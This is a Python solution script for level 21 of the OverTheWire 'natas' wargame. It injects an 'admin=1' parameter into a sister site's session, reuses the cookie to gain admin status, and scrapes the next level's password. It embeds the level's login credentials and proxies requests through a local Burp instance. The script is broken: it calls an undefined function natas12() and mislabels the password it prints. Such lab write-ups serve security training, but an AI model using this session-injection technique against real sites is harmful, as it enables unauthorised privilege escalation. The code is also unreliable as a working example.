import re, requests
USER = 'natas21'
PASS = 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'
URL = f'http://{USER}.natas.labs.overthewire.org/'
url_vulnerable = f'http://{USER}-experimenter.natas.labs.overthewire.org/index.php?debug'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
payload = 'align=center&fontsize=140%25&bgcolor=red&submit=Update&admin=1'
burp = {"http": "http://127.0.0.1:8080"}

def natas21():
    session = requests.Session()
    request = session.post(url=url_vulnerable, auth=auth_basic, headers=header, data=payload, proxies=burp)
    cookie = session.cookies.get_dict()
    response_http = request.text
    if '[admin] => 1' in response_http:
        get_flag = session.get(url=URL, auth=auth_basic, proxies=burp, cookies=cookie)
        response_flag = get_flag.text
        flag = str(re.search(r'Password:[^:]+<', response_flag))
        password = flag.split(':')[1][1: -8]
        print('The password for the natas21 is:', password)
natas12()